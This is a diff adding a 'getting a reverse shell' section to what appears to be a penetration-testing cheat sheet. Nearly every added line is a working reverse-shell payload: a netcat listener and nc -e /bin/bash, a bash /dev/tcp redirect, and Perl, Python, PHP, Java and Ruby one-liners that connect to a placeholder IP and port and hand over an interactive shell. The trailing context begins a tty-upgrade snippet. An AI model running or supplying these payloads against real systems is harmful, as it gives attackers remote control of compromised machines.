@@ -1,3 +1,23 @@
+## getting a reverse shell:-
+Try using netcat as follows:-
+1. on your attacker machine set up a listener by:- nc -lvp "port"
+2. on the compromised machine connect with the listener and spawn by:- shell nc -e /bin/bash "attacking machine IP" "port"
+
+If netcat doesnt work then use netcat to set up listener in the attacker machine via netcat and use the following to get a reverse shell back
+/bin/bash -i >& /dev/tcp/IP/PORT 0>&1 (via bash)<br />
+or<br />
+perl -e 'use Socket;$i="IP";$p="PORT";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};' (via perl)<br />
+or<br />
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' (via python) <br />
+or<br />
+php -r '$sock=fsockopen("IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");' (via php)<br />
+or<br />
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor() (via java)<br />
+or<br />
+ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)' (via ruby)
+
 ## getting a tty shell:-
 python -c ‘import pty; pty.spawn("/bin/bash")’<br />
 or<br />
